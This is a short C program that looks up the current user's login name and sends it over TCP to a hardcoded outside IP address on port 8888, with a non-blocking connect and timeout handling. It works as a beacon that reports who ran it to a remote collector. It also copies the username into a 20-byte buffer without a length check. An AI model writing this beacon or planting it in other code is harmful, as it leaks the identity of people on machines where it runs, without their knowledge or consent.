#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pwd.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <errno.h>

int socket_connect(int port, char *host) {
	int sockfd;
    int retval;
    struct timeval timeout;
	struct sockaddr_in dest_addr;
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror("socket() error");
		exit(1);
	}

	memset(&dest_addr, 0, sizeof(dest_addr));
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(port);
	dest_addr.sin_addr.s_addr = inet_addr(host);

	printf("Connetion TO %s:%d\n",host,port);
	//fflush(stdout);
    fd_set wfds;
    FD_ZERO(&wfds);
    FD_SET(sockfd, &wfds);
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    unsigned long mode1 = 1;
    unsigned long mode0 = 0;

    int error = 0;
    int len = sizeof(error);

    ioctl(sockfd, FIONBIO, &mode1);
    int n = connect(sockfd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (n == 0) {
        ioctl(sockfd, FIONBIO, &(mode0));
    } else if (n < 0 && errno != EINPROGRESS) {
        perror("connect()");
        close(sockfd);
        exit(1);
    }
    retval = select(sockfd + 1, NULL, &wfds, NULL, &timeout);
    if (retval < 0) {
        perror("select()");
        close(sockfd);
        exit(1);
    } else if (retval == 0) {
        printf("connect timeout\n");
        close(sockfd);
        exit(1);
    } else {
        if (getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &error, (socklen_t *)&len) < 0) {
            perror("getsockopt");
            close(sockfd);
            exit(1);
        }
        if (error == 0) {
            return sockfd;
        } else {
            printf("error = %d\n", error);
            printf("errno = %d\n", errno);
            close(sockfd);
            exit(1);
        }
    }
}

int main() {
	int  socket_fd;
	struct passwd *pwd;
    pwd = getpwuid(getuid());	
	char ip_addr[20] = "39.105.82.248"; 
	int port = 8888;
    char username[20] = {0};
    strcpy(username, pwd->pw_name);
	socket_fd = socket_connect(port, ip_addr);
        if(socket_fd > 0){
            printf("success!\n");
        }
    printf("send (%s) to %s\n", username, ip_addr);
    send(socket_fd, username, sizeof(username), 0);
	close(socket_fd);
	return 0;

}
